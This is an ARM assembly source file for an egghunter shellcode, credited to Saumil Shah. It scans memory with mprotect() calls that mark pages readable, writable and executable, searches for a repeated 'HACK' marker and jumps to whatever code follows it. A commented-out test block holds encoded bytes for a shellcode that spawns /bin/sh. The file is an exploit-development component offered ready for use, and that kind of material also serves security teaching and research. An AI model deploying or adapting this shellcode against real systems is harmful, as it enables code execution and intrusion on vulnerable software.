/* egghunter with mprotect()
 * by Saumil Shah - @therealsaumil
 *
 * Suitable for use with XN enabled
 * software, where memory regions
 * containing the egg may not be RWX
 *
 * Departure from using Skape's access()
 * technique for verifying the validity
 * of a memory address
 *
 * Shellcode+EGG size = 60 bytes
 */

.section .text
.global _start

_start:
.code 32
        add    r1, pc, #1       /* Switch to Thumb mode */
        bx     r1
.code 16
        eor    r5, r5, r5       /* r5 = 0, starting address */
        mov    r7, #0x7d        /* mprotect */
        mov    r1, #1
        lsl    r1, #12          /* r1 = 0x1000 */
        mov    r2, #7           /* r2 = RWX */

syscall_loop:
        mov    r0, r5
        svc    #1               /* invoke mprotect() */
        add    r0, r0, #12      /* ENOMEM = -12 */
        bne    valid_page
        add    r5, r5, r1       /* r5 += 0x1000 */
        b      syscall_loop

valid_page:
        add    r6, r5, r1       /* Scan upto r5 + 0x1000 */
        ldr    r0, [pc, #20]    /* EGG stored in r0 */
next_eggs:
        ldr    r3, [r5]
        add    r5, r5, #4       /* next DWORD */
        cmp    r5, r6           /* Check if we have overshot the page */
        beq    syscall_loop     /* Another syscall is required */
        ldr    r4, [r5]
        cmp    r0, r3           /* Check if we have found 1st EGG */
        bne    next_eggs

verify_egg:
        cmp    r3, r4           /* Check if both eggs are the same */
        bne    next_eggs        /* Nope, pick up two more DWORDS */
        add    r5, r5, #4       /* r5 points to the code after the eggs */
        bx     r5

        .ascii "HACK"

/* uncomment this section to enable shellcode testing */
/*
.ascii	"JUNK"
.ascii	"JUNK"
.ascii	"JUNK"
.ascii	"JUNK"
.ascii	"HACKHACK\x01\x30\x8f\xe2\x13\xff\x2f\xe1\x02\xa0\x49\x1a\x0a\x1c\x0b\x27\xc1\x71\x01\xdf/bin/shX"
*/
